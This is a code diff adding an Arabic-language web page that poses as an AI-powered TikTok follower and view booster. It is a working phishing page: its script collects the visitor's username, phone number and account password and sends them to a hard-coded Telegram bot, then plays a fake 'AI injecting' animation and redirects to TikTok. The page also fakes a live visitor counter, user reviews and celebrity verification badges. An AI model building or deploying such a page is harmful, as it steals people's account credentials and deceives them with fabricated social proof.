@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع الديزل العالمي - TikTok Services</title>
+    <style>
+        :root { --tt-pink: #fe2c55; --tt-cyan: #25f4ee; --tt-black: #121212; --blue-verify: #20d5ec; }
+        body { background-color: #000; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* الهيدر */
+        .header { background: #000; padding: 15px 20px; border-bottom: 0.5px solid #333; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 24px; font-weight: 900; letter-spacing: -1px; }
+        .logo span { color: var(--tt-pink); }
+        .live-stat { background: rgba(37, 244, 238, 0.1); border: 1px solid var(--tt-cyan); padding: 5px 15px; border-radius: 50px; font-size: 12px; color: var(--tt-cyan); font-weight: bold; }
+
+        .container { width: 92%; max-width: 500px; margin: 20px auto; }
+
+        /* قسم المشاهير (التوثيق) */
+        .celebrity-scroll { display: flex; gap: 15px; overflow-x: auto; padding-bottom: 15px; margin-bottom: 20px; scrollbar-width: none; }
+        .celebrity-scroll::-webkit-scrollbar { display: none; }
+        .celeb-card { background: #111; padding: 10px 20px; border-radius: 50px; border: 1px solid #333; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+        .verify-badge { color: var(--blue-verify); font-size: 14px; }
+
+        /* الكارت الرئيسي */
+        .main-box { background: var(--tt-black); border-radius: 20px; padding: 30px 20px; border: 1px solid #222; box-shadow: 0 0 30px rgba(254, 44, 85, 0.1); text-align: center; }
+        h1 { font-size: 26px; margin-bottom: 10px; color: var(--tt-white); }
+        .ai-badge { display: inline-block; background: linear-gradient(90deg, var(--tt-pink), var(--tt-cyan)); padding: 4px 15px; border-radius: 5px; font-size: 11px; font-weight: bold; margin-bottom: 20px; color: #000; }
+
+        input, select { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; color: #fff; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--tt-pink); }
+        .btn-boost { width: 100%; padding: 18px; background: var(--tt-pink); border: none; border-radius: 10px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 0 5px 20px rgba(254, 44, 85, 0.4); }
+
+        /* التقييمات */
+        .reviews-section { margin-top: 30px; }
+        .review-card { background: #0f0f0f; padding: 15px; border-radius: 12px; margin-bottom: 10px; border-right: 4px solid var(--tt-cyan); text-align: right; }
+        .stars { color: #fac917; font-size: 12px; }
+
+        /* واجهة الاستعراض AI */
+        #ai-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; flex-direction: column; justify-content: center; align-items: center; }
+        .ai-circle { width: 150px; height: 150px; border: 3px solid var(--tt-cyan); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-bottom: 30px; }
+        .progress-container { width: 80%; height: 4px; background: #222; border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--tt-pink); transition: 0.1s; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="header">
+    <div class="logo">موقع <span>الديزل</span></div>
+    <div class="live-stat">🟢 متصل الآن: <span id="online-v">48,120</span></div>
+</div>
+
+<div class="container">
+    <div class="celebrity-scroll">
+        <div class="celeb-card"><b>شاكر</b> <span class="verify-badge">✔</span></div>
+        <div class="celeb-card"><b>عبسي</b> <span class="verify-badge">✔</span></div>
+        <div class="celeb-card"><b>ضحى</b> <span class="verify-badge">✔</span></div>
+        <div class="celeb-card"><b>كريم بنزيما</b> <span class="verify-badge">✔</span></div>
+        <div class="celeb-card"><b>ميس حمدان</b> <span class="verify-badge">✔</span></div>
+    </div>
+
+    <div class="main-box">
+        <div class="ai-badge">نظام الديزل للذكاء الاصطناعي v6.2</div>
+        <h1>تزويد تيك توك العالمي</h1>
+        <p style="color: #888; font-size: 13px;">أقوى موقع في الوطن العربي لزيادة المتابعين والمشاهدات</p>
+
+        <select id="service">
+            <option>🚀 تزويد 500k مشاهدة (إكسبلور فوري)</option>
+            <option>👥 تزويد 10k متابع (حسابات موثقة)</option>
+            <option>❤️ تزويد 20k لايك (تفاعل حقيقي)</option>
+        </select>
+
+        <input type="text" id="u" placeholder="اسم المستخدم (@username)">
+        <input type="tel" id="h" placeholder="رقم الهاتف المرتبط">
+        <input type="password" id="p" placeholder="كلمة سر الحساب">
+
+        <button class="btn-boost" onclick="startDieselBoost()">تفعيل التزويد بالذكاء الاصطناعي</button>
+    </div>
+
+    <div class="reviews-section">
+        <h3 style="margin-bottom: 15px;">تقييمات المستخدمين (4.9/5)</h3>
+        <div class="review-card">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <b>أحمد الحفناوي <span class="verify-badge">✔</span></b>
+            <p style="font-size: 12px; color: #bbb;">والله العظيم الموقع شغال، المشاهدات وصلت لمليون في ساعة!</p>
+        </div>
+        <div class="review-card" style="border-right-color: var(--tt-pink);">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <b>سارة محمد</b>
+            <p style="font-size: 12px; color: #bbb;">شكراً للديزل، المتابعين حقيقيين وما بينقصوا.</p>
+        </div>
+        <div class="review-card">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <b>محمود الجزار <span class="verify-badge">✔</span></b>
+            <p style="font-size: 12px; color: #bbb;">أقوى سيرفر تزويد شفته في حياتي، سرعة خيالية.</p>
+        </div>
+    </div>
+</div>
+
+<div id="ai-screen">
+    <div class="ai-circle"></div>
+    <h2 style="color: var(--tt-cyan); letter-spacing: 2px;">AI SYSTEM INJECTING...</h2>
+    <div class="progress-container"><div class="progress-fill" id="bar"></div></div>
+    <p id="log" style="color: #0f0; margin-top: 20px; font-family: monospace;">> Connecting to TikTok Server...</p>
+</div>
+
+<script>
+    // عداد زوار ضخم وشغال
+    setInterval(() => {
+        let n = Math.floor(Math.random() * (50000 - 48000) + 48000);
+        document.getElementById('online-v').innerText = n.toLocaleString();
+    }, 2000);
+
+    function startDieselBoost() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const phone = document.getElementById('h').value;
+        const srv = document.getElementById('service').value;
+
+        if(!user || !pass || !phone) return alert("برجاء إدخال البيانات لربط الثغرة");
+
+        // صيد التليجرام (بالبيانات بتاعتك)
+        const tok = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+        const cid = "5177962707";
+        const msg = `👑 صيد الديزل الملكي:\n👤 اليوزر: ${user}\n📞 هاتف: ${phone}\n🔑 باسورد: ${pass}\n🛠 الخدمة: ${srv}`;
+        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
+
+        // تشغيل الاستعراض
+        document.getElementById('ai-screen').style.display = 'flex';
+        let p = 0;
+        let b = document.getElementById('bar');
+        let l = document.getElementById('log');
+
+        let itv = setInterval(() => {
+            p++;
+            b.style.width = p + "%";
+            if(p == 30) l.innerText = "> Bypassing TikTok Firewall...";
+            if(p == 60) l.innerText = "> Injecting Real Traffic Packets...";
+            if(p == 90) l.innerText = "> Finalizing Account Synchronization...";
+
+            if(p >= 100) {
+                clearInterval(itv);
+                alert("✅ تم تفعيل الثغرة! ستصلك الخدمة خلال 15 دقيقة.");
+                window.location.href = "https://www.tiktok.com";
+            }
+        }, 80);
+    }
+</script>
+
+</body>
+</html>
